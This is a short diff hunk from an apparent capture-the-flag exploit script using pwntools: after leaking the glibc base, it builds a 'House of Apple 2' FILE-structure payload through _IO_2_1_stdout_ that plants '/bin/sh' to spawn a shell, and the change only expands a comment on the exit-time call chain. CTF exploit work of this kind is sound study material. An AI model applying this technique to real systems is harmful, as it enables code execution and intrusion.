@@ -19,7 +19,7 @@ glibc_base_addr = int(p.recvline().strip(), 16)-glibc_e.symbols['_IO_2_1_stdout_
 log.info(f"glibc base address: {hex(glibc_base_addr)}")
 
 # 2. house of apple 2 through _IO_2_1_stdout_->_chain (_IO_2_1_stdout_->vtable cannot be exploited because it is not writable since only 0xd8 bytes at most can be read into _IO_2_1_stdout_)
-# _IO_flush_all->_IO_wfile_overflow->_IO_wdoallocbuf
+# exit->__run_exit_handlers->_IO_cleanup->_IO_flush_all->_IO_wfile_overflow->_IO_wdoallocbuf
 payload = flat({
     0x10: b'/bin/sh\x00',
     0x18: 0, # stdout->_IO_read_base
